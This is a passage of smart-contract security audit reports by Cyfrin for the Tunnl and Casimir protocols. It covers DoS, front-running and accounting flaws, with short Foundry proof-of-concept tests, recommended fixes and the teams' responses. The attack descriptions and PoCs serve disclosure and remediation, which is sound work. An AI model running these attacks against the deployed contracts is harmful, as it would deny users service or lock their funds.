  maxCreatorPayment: 102439024 <- This must be the same to the offered amount 100e6
  maxCreatorPayment: 102439024
```
**Recommended Mitigation:** Fix the `sendFunctionsRequest()` function as below. Note that the team reported another issue in using the fee percentage value from `s_config` instead of the `s_offers[offerId]` and the mitigiation below reflects that as well.
```diff
        uint256 maxCreatorPayment = uint256((s_offers[offerId].maxValueUsdc - s_offers[offerId].flatFeeUsdc) * 10000)//@audit-info why not use the percentage directly - (s_offers[offerId].maxValueUsdc - s_offers[offerId].flatFeeUsdc) * (10000 - s_config.creatorFeePercentageBP) / 10000
--            / uint256(10000 + s_config.creatorFeePercentageBP);
++           / uint256(10000 + s_offers[offerId].advertiserFeePercentageBP);
```
**Tunnl:** Fixed in [PR 37](https://github.com/tunnl-io/Tunnl-Contracts/pull/37/files).

**Cyfrin:** Verified.

\clearpage
## Medium Risk


### An attacker can flood the protocol with false offers to cause DoS

**NOTE:** This finding assumes the protocol fixed the other issue of incomplete implementation of state transition from Pending to Expired.

**Description:** The protocol maintains a set of all offers and they are managed by Chainlink automation functions : `checkUpkeep()` and `performUpkeep()`.
The function `checkUpkeep()` iterates all offers in `s_offersToUpkeep` and checks the necessity of upkeeping.
```solidity
TunnlTwitterOffers.sol
299:     function checkUpkeep(bytes calldata) external view override returns (bool upkeepNeeded, bytes memory performData) {
300:         bytes32[] memory offersToUpkeep = new bytes32[](0);
301:         for (uint256 i = 0; i < s_offersToUpkeep.length(); i++) {
302:             bytes32 offerId = s_offersToUpkeep.at(i);
303:             if (
304:                 _needsVerificationRequest(s_offers[offerId].status, s_offers[offerId].dateToAttemptVerification) ||
305:                 _needsExpiration(s_offers[offerId].status, s_offers[offerId].payoutDate, s_offers[offerId].acceptanceExpirationDate) ||
306:                 _needsPayoutRequest(s_offers[offerId].status, s_offers[offerId].payoutDate)
307:             ) {
308:                 offersToUpkeep = appendOfferToUpkeep(offersToUpkeep, offerId);
309:                 if (offersToUpkeep.length == s_config.automationUpkeepBatchSize) {
310:                     return (true, abi.encode(offersToUpkeep));
311:                 }
312:             }
313:         }
314:         return (offersToUpkeep.length > 0, abi.encode(offersToUpkeep));
315:     }
```
The ones that are necessary to upkeep are added to a local variable `offersToUpkeep` and it is returned once the number of offers to upkeep equals to the `s_config.automationUpkeepBatchSize`.

An offer is necessary to upkeep if it either needs verification / payout function request OR it is expired.
```solidity
TunnlTwitterOffers.sol
479:     function _needsExpiration(Status offerStatus, uint32 payoutDate, uint32 acceptanceExpirationDate) internal view returns (bool) {
480:         return (
481:             (acceptanceExpirationDate < block.timestamp && offerStatus == Status.Pending) ||
482:             (payoutDate < block.timestamp &&
483:             (offerStatus == Status.Accepted ||
484:             offerStatus == Status.AwaitingVerification ||
485:             offerStatus == Status.VerificationInFlight ||
486:             offerStatus == Status.VerificationFailed))
487:         );
488:     }
```
As we can see in the above, an offer needs expiration if it is still in Pending and current time is later than `acceptanceExpirationDate`.

Now the problem is anyone can create any offers as long as they have enough allowance and there is no lower limit on the `maxPaymentUsdc` (maximum offer amount).
So technically, anyone can create any number of offers with zero offer amount as long as they have a single allowance of `flatFeeUSDC`.
These false offers will not be accepted by anyone because these will not bring any economical benefits to creators.
After all, the offers will stay Pending in the `offersToUpkeep`.
An attacker can exploit this by creating tons of false offers so that the Chainlink automation functions can not pick up the correct offer to handle (either verification or payout) and cause Denial-Of-Service.

**Impact:** We evaluate the impact to be Medium because it does not bring direct economical benefits to the attacker.

**Proof Of Concept:**
The PoC below shows anyone can create any number of offers without approving significant amount.
```solidity
    function test_CreateFalseOffers() public {
        uint32 acceptanceDurationSeconds = tunnlTwitterOffers.getConfig().minAcceptanceDurationSeconds;
        uint offerAmount = 0;
        uint maxValueUsdc = tunnlTwitterOffers.getConfig().flatFeeUsdc;

        vm.startPrank(advertiser);
        mockUsdcToken.mint(advertiser, maxValueUsdc);
        mockUsdcToken.approve(address(tunnlTwitterOffers), maxValueUsdc);//@audit-info single allowance of 5 USDC
        for(uint i = 100; i < 200; i++) {
            offerId = bytes32(i);
            tunnlTwitterOffers.createOffer(offerId, offerAmount, acceptanceDurationSeconds, 4 days);

            //@audit-info verifies the offer is created with the correct values
            assertEq(uint(getOffer(offerId).status), 0);
            assertEq(getOffer(offerId).flatFeeUsdc, tunnlTwitterOffers.getConfig().flatFeeUsdc);
            assertEq(getOffer(offerId).advertiserFeePercentageBP, tunnlTwitterOffers.getConfig().advertiserFeePercentageBP);
            assertEq(getOffer(offerId).creationDate, block.timestamp);
            assertEq(getOffer(offerId).acceptanceExpirationDate, block.timestamp + acceptanceDurationSeconds);
            assertEq(getOffer(offerId).advertiser, advertiser);
        }
        vm.stopPrank();
    }
```
**Recommended Mitigation:** There are several possible mitigations.
- Limit the number of offers that an address can hold at a time. This will prevent users to maintain bunch of offers with a small amount of allowance.
- Require the advertiser to pay flatFee on offer creation instead of offer acceptance and refund it if the offer is canceled or expired.


**Tunnl:** We first need to fix such that Pending offers are correctly added & removed from `s_offersToUpkeep`.
We have decided not to address the DoS issue prior to the mainnet Beta launch as we think the risk of a competitor attempting to attack our product is very low within the first few weeks after launch.
HOWEVER we will make a backlog task on our side to address this issue in our next iteration to prevent attacks from malicious competitors.

**Cyfrin:** Acknowledged.


### Malicious creators can force advertisers to pay the flat fee by cancelling accepted offers

**Description:** The protocol charges a `flatFee` for all offers when they are accepted. Once accepted, the `flatFee` is sent to the protocol owners address and is NOT refunded under any circumstances, including cancellation or expiration.

While this could be intentional, there is another issue related to malicious creators. After acceptance, if the content creator does nothing, the offer expires after `Offer.payoutDate` and the funds are refunded to the advertiser except for the flat fee. Or the content creator can call `cancelOffer()` to cancel the offer.

Although it is understood that there exists an off-chain backend mechanism to manage creators, it is desirable to have an on-chain escrow feature for the creators as well. This would require creators to put up some collateral when they accept an offer, which would reimburse the advertiser for their loss if the creator breaks the deal.

The current implementation can lead to situations where advertisers incur losses due to the non-refundable flat fee and potential malicious behavior by content creators. This could result in a lack of trust and reduced participation in the protocol.

**Impact:** We evaluate the overall impact to be Medium because the accepting offer is handled by admin.

**Recommended Mitigation:** Implement an on-chain escrow feature requiring creators to provide collateral when accepting an offer. This collateral would be used to reimburse advertisers in case the creator fails to fulfill their obligations.

**Tunnl:** For the Tunnl Beta Launch, we are accepting this as designed. Tunnl always has the option to manually reimburse Advertisers for this flat fee which is feasible for our beta given we will only have a few dozen initial users.
Charging Creators is not an acceptable solution as this would now require Creators to send a transaction or enter some other payment method which we are trying to avoid given this would worsen the user experience for Creators. Currently, Creators only need to paste their wallet address into our UI and we handle the rest; we want to keep this super simple UX for Creators without them needing to do anything else.

HOWEVER: We will update this in the future by always charging Advertisers the flat fee for creating an offer without any refund mechanism to avoid confusion. We can simply charge a lower flat fee so this is more acceptable for Advertisers (say <$1). This can mitigate spammy offers too since Advertisers would always need to pay for each one they send. We will determine feasibility & final fee value based on gas prices on the Base blockchain during our beta launch.


**Cyfrin:** Acknowledged.


### Using a wrong fee percentage [Self-Reported]

**Description:** In the middle of the audit, the Tunnl team spotted a bug in the function `sendFunctionsRequest()`.
While the function calculates the `maxCreatorPayment`, it was using the `s_config.creatorFeePercentageBP` instead of `s_offers[offerId].creatorFeePercentageBP`.
This could potentially affect the payment amount to the content creators when there is a change in the configuration.

**Impact:** We evaluate the impact to be Medium because of the low likelihood.

**Tunnl:** Fixed in [PR 37](https://github.com/tunnl-io/Tunnl-Contracts/pull/37/files).

**Cyfrin:** Verified.




### Incomplete implementation of state transition from Pending to Expired

**Description:** All offers follow a strict state transition defined by the protocol. We extracted all possible state transitions based on the conditionals that define the possible states before changing into a new state.

Looking at the implementation of the function `performUpkeep()`, we can see that the developer assumed a possible state transition from `Pending` to `Expired`.

```solidity
TunnlTwitterOffers.sol
322:     function performUpkeep(bytes calldata performData) external override {
323:         bytes32[] memory offersToUpkeep = abi.decode(performData, (bytes32[]));
324:
325:         for (uint256 i = 0; i < offersToUpkeep.length; i++) {//@audit-info checks only the offersToUpkeep
326:             bytes32 offerId = offersToUpkeep[i];
327:
328:             if (_needsVerificationRequest(s_offers[offerId].status, s_offers[offerId].dateToAttemptVerification)) {
329:                 s_offers[offerId].status = Status.VerificationInFlight;
330:                 sendFunctionsRequest(offerId, RequestType.Verification);
331:             } else if (_needsExpiration(s_offers[offerId].status, s_offers[offerId].payoutDate, s_offers[offerId].acceptanceExpirationDate)) {
332:                 // Update status before making the external call
333:                 Status previousStatus = s_offers[offerId].status;
334:                 s_offers[offerId].status = Status.Expired;
335:                 s_offersToUpkeep.remove(offerId);
336:                 if (previousStatus == Status.Pending) {//@audit-info Pending -> Expired
337:                     // If expired BEFORE offer is accepted & funds have been locked in escrow, "revoke" the allowance by sending the advertiser's funds back to themselves
338:                     _revokeAllowanceForPendingOffer(offerId);
339:                 } else {
340:                     // If expired AFTER offer is accepted & funds have been locked in escrow, release the funds in escrow back to the advertiser
341:                     uint256 amountToTransfer = s_offers[offerId].maxValueUsdc - s_offers[offerId].flatFeeUsdc;
342:                     usdcToken.safeTransfer(s_offers[offerId].advertiser, amountToTransfer);
343:                 }
344:                 emit OfferStatus(offerId, previousStatus, Status.Expired);
345:             } else if (_needsPayoutRequest(s_offers[offerId].status, s_offers[offerId].payoutDate)) {
346:                 s_offers[offerId].status = Status.PayoutInFlight;
347:                 sendFunctionsRequest(offerId, RequestType.Payout);
348:             }
349:         }
350:     }
```
The outer for loop is for `offersToUpkeep` that is supposed to be retrieved using a function `checkUpkeep()`. The function `checkUpkeep()` checks the offers in the set `s_offersToUpkeep` and an offer is added to this set ONLY when they are accepted. Hence, pending offers are not added to `s_offersToUpkeep` at all and the state transition from Pending to Expired does not happen.

Via the communication with the Tunnl team, it is confirmed that they intended to add Pending offers to the set `s_offersToUpkeep`.

**Impact:** We would evaluate the impact to be Medium because this finding does not incur financial loss or serious system dysfunctionality directly.

**Recommended Mitigation:** We recommend to add the Pending offers to the upkeep list and also to review other state transitions.


**Tunnl:** Fixed in [PR 38](https://github.com/tunnl-io/Tunnl-Contracts/pull/38/files).

**Cyfrin:** Verified.


### Attackers can prevent users creating an offer by frontrunning

**Description:** The protocol allows anyone to create offers with an offer ID provided by the user. While this design gives users the flexibility to choose their offer ID, it also introduces a problem.

The `createOffer` function checks if an offer with the provided ID already exists and reverts if it does.
```solidity
TunnlTwitterOffers.sol
152:     function createOffer(bytes32 offerId, uint256 maxPaymentUsdc, uint32 acceptanceDurationSeconds, uint32 _offerDurationSeconds) external {
153:
154:         require(offerId != bytes32(0), "Invalid offerId");
155:         require(s_offers[offerId].creationDate == 0, "Offer already exists"); //@audit Can be abused to prevent offer creation
156:         require(acceptanceDurationSeconds >= s_config.minAcceptanceDurationSeconds, "AcceptanceDuration is too short");
157:         require(_offerDurationSeconds >= s_config.minOfferDurationSeconds, "OfferDuration is too short");
```

Malicious actors can abuse this and prevent normal users from creating offers.

Example:
- Alice, an attacker, decides to harm the protocol's reputation.
- Alice allows the `flatFee` amount of USDC to the protocol and monitors the mempool.
- A legitimate user, Bob, tries to create an offer with ID="BOB".
- Alice sends a front-running transaction to create a fake offer with the same ID.
- Alice's fake offer is created, and Bob's transaction reverts because an offer with the same ID already exists.

The impact is amplified for the following reasons:
- The protocol does not require actual funding but only an allowance for the creation of offers. Anyone can create any number of offers with a single allowance of the `flatFee` amount of USDC.
- Alice can choose to disrupt only "big" offers from reputable advertisers.

While the attack is not economically beneficial for the attacker, it is quite feasible for a possible competitor to run this kind of malicious activity. Additionally, the protocol will be deployed on Base(L2), where gas costs will be minor.

**Impact:** We evaluate the impact to be Medium because the attack does not directly affect users' funds and is not economically beneficial for the attacker.

**Proof Of Concept:**
```solidity
    function test_FrontrunCreateOffer() public {
        address alice = address(0x10); // malicious actor
        address bob = address(0x20); // legitimate actor

        uint32 acceptanceDurationSeconds = tunnlTwitterOffers.getConfig().minAcceptanceDurationSeconds;
        uint offerAmount = 1e6;
        uint maxValueUsdc = tunnlTwitterOffers.getConfig().flatFeeUsdc + offerAmount;
        uint minAllowance = tunnlTwitterOffers.getConfig().flatFeeUsdc;

        // alice allows minimal amount of USDC to the contract
        vm.startPrank(alice);
        mockUsdcToken.mint(alice, minAllowance);
        mockUsdcToken.approve(address(tunnlTwitterOffers), minAllowance);
        vm.stopPrank();

        // bob intends to create an offer with id = 101010 (this is normally calculated offchain but here we just use an imaginary id)
        vm.startPrank(bob);
        mockUsdcToken.mint(bob, maxValueUsdc);
        mockUsdcToken.approve(address(tunnlTwitterOffers), maxValueUsdc);
        vm.stopPrank();

        offerId = bytes32(uint(0x101010));

        // alice front runs bob and creates an offer with the same id
        vm.startPrank(alice);
        tunnlTwitterOffers.createOffer(offerId, 0, acceptanceDurationSeconds, 4 days);
        vm.stopPrank();

        // now bob's offer creation reverts
        vm.startPrank(bob);
        vm.expectRevert("Offer already exists");
        tunnlTwitterOffers.createOffer(offerId, offerAmount, acceptanceDurationSeconds, 4 days);
        vm.stopPrank();
    }
```
**Recommended Mitigation:** We recommend adding a mechanism to verify the `msg.sender` with the `offerId` in `createOffer()`.

**Tunnl:** We have decided not to address this frontrunning issue prior to the mainnet Beta launch as we think the risk of a competitor attempting to attack our product is very low within the first few weeks after launch.
HOWEVER: we will make a backlog task on our side to address this issue in our next iteration to prevent attacks from malicious competitors.
A potential solution would be to have the backend generate an approval signature which is given to the user and must be included in their `createOffer` transaction.

**Cyfrin:** Acknowledged. (The potential solution approach could resolve the issue.)


\clearpage
## Informational


### Some variable and argument names are misleading

**Description:** The use of misleading variable and argument names may result in incorrect implementation. It is recommended that these names be revised to enhance clarity and maintain code integrity.

- `maxPaymentUsdc` -> `maxOfferedAmountUSDC`
```solidity
L152: function createOffer(bytes32 offerId, uint256 maxPaymentUsdc, uint32 acceptanceDurationSeconds, uint32 _offerDurationSeconds)
```

- `Offer.maxValueUsdc` -> `Offer.totalPaymentFromAdvertiser`
```solidity
L72: uint256 maxValueUsdc; // Percentage fee + flat fee + maximum payment the content creator can receive in USDC
```

- `Offer.amountPaidUsdc` -> `Offer.netAmountPaidUsdc`
```solidity
L73: uint256 amountPaidUsdc; // The final amount paid to the content creator in USDC
```

**Tunnl:** Fixed in [PR 38](https://github.com/tunnl-io/Tunnl-Contracts/pull/38/files).

**Cyfrin:** Verified.


### Unnecessary duplicate state logic

**Description:** The offer status is set two times to the same value in function `performUpkeep` and `sendFunctionsRequest`.
Note that this kind of duplicate logic can cause a security issue in the future, e.g. the team might miss changing one of the two occurences.

```solidity
TunnlTwitterOffers.sol - performUpkeep
328:             if (_needsVerificationRequest(s_offers[offerId].status, s_offers[offerId].dateToAttemptVerification)) {
329:                 s_offers[offerId].status = Status.VerificationInFlight;
330:                 sendFunctionsRequest(offerId, RequestType.Verification);
331:
```

```solidity
TunnlTwitterOffers.sol - sendFunctionsRequest
395:         s_offers[offerId].status = requestType == RequestType.Verification
396:             ? Status.VerificationInFlight
397:             : Status.PayoutInFlight;
398:         emit RequestSent(offerId, requestId, s_offers[offerId].status);
```

**Tunnl:** Fixed in [PR 38](https://github.com/tunnl-io/Tunnl-Contracts/pull/38/files).

**Cyfrin:** Verified.


### Unnecessary use of OpenZeppelin's nonReentrant

**Description:** The contract `TunnlTwitterOffers` uses the OpenZeppelin's `nonReentrant` modifier in a function `retryRequests()`.
But the implementation does not need this modifier.
The function `retryRequests()` only makes calls to an internal function `sendFunctionsRequest()` and there is no external call in the process.
Furthermore, the function `retryRequests()` is restricted by `onlyAdmins` modifier.
We did further analysis and concluded that the protocol does not need the `nonReentrant` modifier as long as the payment token is fixed to USDC.

**Tunnl:** Fixed in [PR 38](https://github.com/tunnl-io/Tunnl-Contracts/pull/38/files).

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2024-07-01-cyfrin-tunnl-v2.0.md ------


------ FILE START car/reports_md/2024-07-10-cyfrin-casimir-v2.0.md ------

**Lead Auditors**

[Hans](https://twitter.com/hansfriese)

[0kage](https://twitter.com/0kage_eth)

**Assisting Auditors**



---

# Findings
## Critical Risk


### Attacker can cause a DOS during unstaking by intentionally reverting the transaction when receiving ETH

**Description:** The function `fulfillUnstake()` is used internally to fulfill unstake requests for users. It performs a low-level call to the `userAddress` to transfer ETH and reverses the transaction if the transfer fails. Moreover, the contract processes all unstake requests in a First-In-First-Out (FIFO) queue, meaning it must process earlier requests before handling later ones.

An attacker could exploit this by intentionally triggering a revert on the `receive()` function. This action would cause `fulfillUnstake()` to revert and block the entire unstake queue.
```solidity
function fulfillUnstake(address userAddress, uint256 amount) private {
    (bool success,) = userAddress.call{value: amount}(""); // @audit DOS by reverting on `receive()`
    if (!success) {
        revert TransferFailed();
    }
    emit UnstakeFulfilled(userAddress, amount);
}
```

**Impact:** This can result in a Denial of Service for all unstake requests, thereby locking users funds.

**Recommended Mitigation:** Consider using the Pull-over-Push pattern.
Reference: https://fravoll.github.io/solidity-patterns/pull_over_push.html

**Casimir:**
Fixed in [cdbe7b1](https://github.com/casimirlabs/casimir-contracts/commit/cdbe7b1ed9e61a58d7971087e9b6e582eb36a55b)

**Cyfrin:** Verified.


### Function `claimEffectiveBalance()` may consistently revert, making it impossible to complete queue withdrawals

**Description:** The function attempts to remove the withdrawal at index `0`, while it uses the withdrawal at index `i` to call `completeQueuedWithdrawal()`. Since each withdrawal can only be completed once, the `delayedEffectiveBalanceQueue[]` list will eventually contain withdrawals that have already been completed. When the function tries to complete a withdrawal that has already been completed, it invariably reverts.

```solidity
for (uint256 i; i < delayedEffectiveBalanceQueue.length; i++) {
    IDelegationManager.Withdrawal memory withdrawal = delayedEffectiveBalanceQueue[i];
    if (uint32(block.number) - withdrawal.startBlock > withdrawalDelay) {
        delayedEffectiveBalanceQueue.remove(0); // @audit Remove withdrawal at index 0
        claimedEffectiveBalance += withdrawal.shares[0];
        eigenDelegationManager.completeQueuedWithdrawal(withdrawal, tokens, 0, true); // @audit Complete withdrawal of index i
    } else {
        break;
    }
}
```

**Impact:** The `claimEffectiveBalance()` function consistently reverts, making it impossible to complete queue withdrawals and therefore locking ETH.

**Proof of Concept:** Consider the following scenario:

1. Initially, the `delayedEffectiveBalanceQueue[]` list includes five withdrawals `[a, b, c, d, e]`.
2. The `claimEffectiveBalance()` function is called.
    - In the first loop iteration `i = 0`, withdrawal `a` is removed and completed. The list now becomes `[b, c, d, e]`.
    - In the second loop iteration `i = 1`, withdrawal `b` is removed, but withdrawal `c` is completed. The list now becomes `[c, d, e]`.
    - In the third loop iteration `i = 2`, the function checks withdrawal `e` and assumes the withdrawal delay has not yet been reached. The loop breaks at this point and the function stops.
3. The next time the `claimEffectiveBalance()` function is called.
    - In the first loop iteration `i = 0`, the function tries to remove and complete withdrawal `c`. However, since withdrawal `c` has already been completed, the call to `completeQueuedWithdrawal()` will revert.

**Recommended Mitigation:** Consider using a consistent index for checking, removing and completing withdrawals.

**Casimir:**
Fixed in [35fdf1e](https://github.com/casimirlabs/casimir-contracts/commit/35fdf1e42ad2a38f47028a8468efc0e78e6e7f67)

**Cyfrin:** Verified.


### Delayed rewards can be claimed without updating internal accounting

**Description:** The `claimRewards()` function is designed to claim delayed withdrawals from the EigenLayer Delayed Withdrawal Router and to update accounting variables such as `delayedRewards` and `reservedFeeBalance`.

```solidity
function claimRewards() external {
    onlyReporter();

    uint256 initialWithdrawalsBalance = address(eigenWithdrawals).balance;
    eigenWithdrawals.claimDelayedWithdrawals(
        eigenWithdrawals.getClaimableUserDelayedWithdrawals(address(this)).length
    );
    uint256 claimedAmount = initialWithdrawalsBalance - address(eigenWithdrawals).balance;
    delayedRewards -= claimedAmount;

    uint256 rewardsAfterFee = subtractRewardFee(claimedAmount);
    reservedFeeBalance += claimedAmount - rewardsAfterFee;
    distributeStake(rewardsAfterFee);

    emit RewardsClaimed(rewardsAfterFee);
}
```

However, this function can be bypassed by directly executing the claim on the EigenLayer side via the `DelayedWithdrawalRouter::claimDelayedWithdrawals()` function. This function allows the caller to claim withdrawals for a specified recipient, with the recipient's address provided as an input. If the `CasimirManager` contract address is used as the `recipient`, the claim is made on its behalf.

**Impact:** This process does not update the accounting variables, leading to inaccurate accounting within the contract. Even though the rewards have been claimed, they are still accounted for in the `delayedRewards`, resulting in an incorrect total stake value.

**Proof of Concept:** EigenLayer contract that handles delayed withdrawal claims can be found [here](https://github.com/Layr-Labs/eigenlayer-contracts/blob/0139d6213927c0a7812578899ddd3dda58051928/src/contracts/pods/DelayedWithdrawalRouter.sol#L80)

**Recommended Mitigation:** Consider altering the way the contract manages rewards claims. This could be achieved by moving the accounting for claimed reward amounts to the `receive()` function, and by only filtering funds received from the `eigenWithdrawals` contract.

**Casimir:**
Fixed in [4adef64](https://github.com/casimirlabs/casimir-contracts/commit/4adef6482238c3d0926f72ffdff04e7a49886045)

**Cyfrin:** Verified.


### Anyone can submit proofs via  EigenPod `verifyAndProcessWithdrawals` to break the accounting of `withdrawRewards`

**Description:** `CasimirManager::withdrawRewards` is an `onlyReporter` operation that performs the key tasks below:

1. Submits proofs related to the partial withdrawal of a validator at a given index.
2. Updates the `delayedRewards` based on the last element in the array of `userDelayedWithdrawalByIndex`.

Note that anyone, not just the pod owner, can submit proofs directly to `EigenPod::verifyAndProcessWithdrawals`. In such a case, the `delayedRewards` will not be updated, and the subsequent accounting during report finalization will be broken.

Any attempt to withdraw rewards by calling `CasimirManager::withdrawRewards` will revert because the withdrawal has already been processed. Consequently, `delayedRewards` will never be updated.

This same issue is applicable when submitting proofs for processing a full withdrawal. Critical accounting parameters that are updated in `CasimirManager::withdrawValidator` are effectively bypassed when proofs are directly submitted to EigenLayer.

**Impact:** If `delayedRewards` is not updated, the `rewardStakeRatioSum` and `latestActiveBalanceAfterFee` accounting will be broken.

**Recommended Mitigation:** EigenLayer does not restrict access to process withdrawals only to the pod owner. To that extent, access control to `CasimirManager::withdrawRewards` can always be bypassed. Assuming that all withdrawals will happen only through a reporter, consider adding logic that directly tracks the `eigenWithdrawals.delayedWithdrawals` and `eigenWithdrawals.delayedWithdrawalsCompleted` on EigenLayer to calculate delayedRewards.

**Casimir:**
Fixed in [eb31b43](https://github.com/casimirlabs/casimir-contracts/commit/eb31b4349e69eb401615e0eca253e9ab8cc0999d)

**Cyfrin:** Verified.


### Front-run withdrawValidator by submitting proofs can permanently DOS validator unstaking on EigenLayer

**Description:** An attacker can observe the mempool and front-run the `CasimirManager::withdrawValidator` transaction by submitting the same proofs directly on Eigen Layer.

Since the proof is already verified, the `CasimirManager::withdrawValidator` transaction will revert when it tries to submit the same proofs. Submitting an empty proof to bypass proof verification also does not work because the `finalEffectiveBalance` will always be 0, preventing the queuing of withdrawals.

````solidity
function withdrawValidator(
    uint256 stakedValidatorIndex,
    WithdrawalProofs memory proofs,
    ISSVClusters.Cluster memory cluster
) external {
    onlyReporter();

   // ..code...

    uint256 initialDelayedRewardsLength = eigenWithdrawals.userWithdrawalsLength(address(this)); //@note this holds the rewards
    uint64 initialDelayedEffectiveBalanceGwei = eigenPod.withdrawableRestakedExecutionLayerGwei(); //@note this has the current ETH balance

>   eigenPod.verifyAndProcessWithdrawals(
        proofs.oracleTimestamp,
        proofs.stateRootProof,
        proofs.withdrawalProofs,
        proofs.validatorFieldsProofs,
        proofs.validatorFields,
        proofs.withdrawalFields
    ); //@audit reverts if proof is already verified

    {
        uint256 updatedDelayedRewardsLength = eigenWithdrawals.userWithdrawalsLength(address(this));
        if (updatedDelayedRewardsLength > initialDelayedRewardsLength) {
            IDelayedWithdrawalRouter.DelayedWithdrawal memory withdrawal =
                eigenWithdrawals.userDelayedWithdrawalByIndex(address(this), updatedDelayedRewardsLength - 1);
            if (withdrawal.blockCreated == block.number) {
                delayedRewards += withdrawal.amount;
                emit RewardsDelayed(withdrawal.amount);
            }
        }
    }

    uint64 updatedDelayedEffectiveBalanceGwei = eigenPod.withdrawableRestakedExecutionLayerGwei();
>   uint256 finalEffectiveBalance =
        (updatedDelayedEffectiveBalanceGwei - initialDelayedEffectiveBalanceGwei) * GWEI_TO_WEI; //@audit if no proofs submitted, this will be 0
    delayedEffectiveBalance += finalEffectiveBalance;
    reportWithdrawnEffectiveBalance += finalEffectiveBalance;
}

//... code
````

**Impact:** At a negligible cost, an attacker can prevent validator withdrawals on EigenLayer, creating an insolvency risk for Casimir.

**Recommended Mitigation:** Consider making the following changes to `CasimirManager::withdrawValidators`:

- Split the function into two separate functions, one for full-withdrawal verifications and another for queuing verified withdrawals.
- Listen to the following event emission in `EigenPod::_processFullWithdrawal` and filter the events emitted with the recipient as `CasimirManager`.
````solidity
event FullWithdrawalRedeemed(
    uint40 validatorIndex,
    uint64 withdrawalTimestamp,
    address indexed recipient,
    uint64 withdrawalAmountGwei
);
````
- Introduce a try-catch while verifying withdrawal for each applicable validator index. If a proof is already verified, update the `stakedValidatorIds` array and reduce `requestedExits` in the catch section.
- Once all withdrawals are verified, use the event emissions to create a `QueuedWithdrawalParams` array that will be sent to the second function that internally calls `eigenDelegationManager.queueWithdrawals(params)`.
- Update the `delayedEffectiveBalance` and `reportWithdrawnEffectiveBalance` at this stage.

Note: This assumes that the `reporter` is protocol-controlled.

**Casimir:**
Fixed in [eb31b43](https://github.com/casimirlabs/casimir-contracts/commit/eb31b4349e69eb401615e0eca253e9ab8cc0999d)

**Cyfrin:** Verified. Withdrawal proofs are decoupled from queuing withdrawals on EigenLayer. This successfully mitigates the Denial of Service risk reported in this issue. It is noted however that the effective balance is hardcoded as 32 ether.

It is recommended that the effective balance is passed as a parameter by monitoring the full withdrawal event on EigenLayer.


### Incorrect accounting of `tipBalance` can indefinitely stall report execution

**Description:** The `receive` fallback function in `CasimirManager` increases `tip` balance if the sender is not the `DelayedWithdrawalRouter`. The implicit assumption here is that all withdrawals, full or partial, are routed via the `DelayedWithdrawalRouter`. While this assumption is true incase of partial withdrawals (rewards), this is an incorrect assumption for full withdrawals where the sender is not the `DelayedWithdrawalRouter` but the `EigenPod` itself.

```solidity
    receive() external payable {
        if (msg.sender != address(eigenWithdrawals)) {
            tipBalance += msg.value; //@audit tip balance increases even incase of full withdrawals

            emit TipsReceived(msg.value);
        }
    }

```

Note that the owner can fully withdraw any tips via the `CasimirManager:claimTips`

```solidity
    function claimTips() external {
        onlyReporter();

        uint256 tipsAfterFee = subtractRewardFee(tipBalance);
        reservedFeeBalance += tipBalance - tipsAfterFee;
        tipBalance = 0;
        distributeStake(tipsAfterFee);
        emit TipsClaimed(tipsAfterFee);
    }

```

When tips are claimed by owner, the `withdrawnEffectiveBalance` which was incremented while claiming full withdrawals via `CasimirManager::claimEffectiveBalance` will be out-of-sync with the actual ETH balance. Effectively, the key invariant here that `CasimirManager.balance >= withdrawnEffectiveBalance` can get violated.

```solidity
    function claimEffectiveBalance() external {
        onlyReporter();

        IStrategy[] memory strategies = new IStrategy[](1);
        strategies[0] = IDelegationManagerViews(address(eigenDelegationManager)).beaconChainETHStrategy();
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(0));

        uint256 withdrawalDelay = eigenDelegationManager.strategyWithdrawalDelayBlocks(strategies[0]);
        uint256 claimedEffectiveBalance;
        for (uint256 i; i < delayedEffectiveBalanceQueue.length; i++) {
            IDelegationManager.Withdrawal memory withdrawal = delayedEffectiveBalanceQueue[i];
            if (uint32(block.number) - withdrawal.startBlock > withdrawalDelay) {
                delayedEffectiveBalanceQueue.remove(0);
                claimedEffectiveBalance += withdrawal.shares[0];
                eigenDelegationManager.completeQueuedWithdrawal(withdrawal, tokens, 0, true);
            } else {
                break;
            }
        }

        delayedEffectiveBalance -= claimedEffectiveBalance;
        withdrawnEffectiveBalance += claimedEffectiveBalance; //@audit this accounting entry should be backed by ETH balance at all times
    }

```

**Impact:** Accounting error in `tipBalance` calculation can cause failure of `fulfilUnstakes` as the `withdrawnEffectiveBalance` is out-of-sync with actual ETH balance in CasimirManager. This can potentially stall report execution from time to time.

**Recommended Mitigation:** Consider incrementing `tipBalance` only if the sender is neither the `DelayedWithdrawalRouter` nor the `EigenPod`

**Casimir:**
Fixed in [4adef64](https://github.com/casimirlabs/casimir-contracts/commit/4adef6482238c3d0926f72ffdff04e7a49886045)

**Cyfrin:** Verified.

\clearpage
## High Risk


### Function `getTotalStake()` fails to account for pending validators, leading to inaccurate accounting

**Description:** The `getTotalStake()` function is the core accounting function to calculate the total stake of the `CasimirManager`. It's used to compute the change for `rewardStakeRatioSum` within the `finalizeReport()` function.

```solidity
function getTotalStake() public view returns (uint256 totalStake) {
  // @audit Validators in pending state is not accounted for
  totalStake = unassignedBalance + readyValidatorIds.length * VALIDATOR_CAPACITY + latestActiveBalanceAfterFee
      + delayedEffectiveBalance + withdrawnEffectiveBalance + subtractRewardFee(delayedRewards) - unstakeQueueAmount;
}
```

This function aggregates the stakes from various sources, including the `32 ETH` from each "ready validator" (`readyValidatorIds.length * VALIDATOR_CAPACITY`) and the ETH staked in "staked validators" (`latestActiveBalanceAfterFee`).

However, it fails to account for the ETH in pending validators.

A validator must go through three steps to become active/staked:

1. Every time users make a deposit, the contract checks if the unassigned balance has reached `32 ETH`. If it has, the next validator ID is added to `readyValidatorIds`.
2. The reporter calls `depositValidator()` to deposit `32 ETH` from the validator into the beacon deposit contract. In this step, the validator ID moves from `readyValidatorIds` to `pendingValidatorIds`.
3. The reporter calls `activateValidator()`, which moves the validator ID from `pendingValidatorIds` to `stakedValidatorIds` and updates `latestActiveBalanceAfterFee` to reflect the total stake in the beacon chain.

As shown, the `getTotalStake()` function accounts for validators in steps 1 and 3, but ignores the stake of validators in the pending state (step 2). In the current design, there is nothing that stops report finalization if pending validators > 0.

**Impact:** FunctiongetTotalStake()will return the value of total stake less than it should be. The result isrewardStakeRatioSumcalculation will be incorrect in a scenario where all pending validators are not activated before report finalization.

```solidity
uint256 totalStake = getTotalStake();

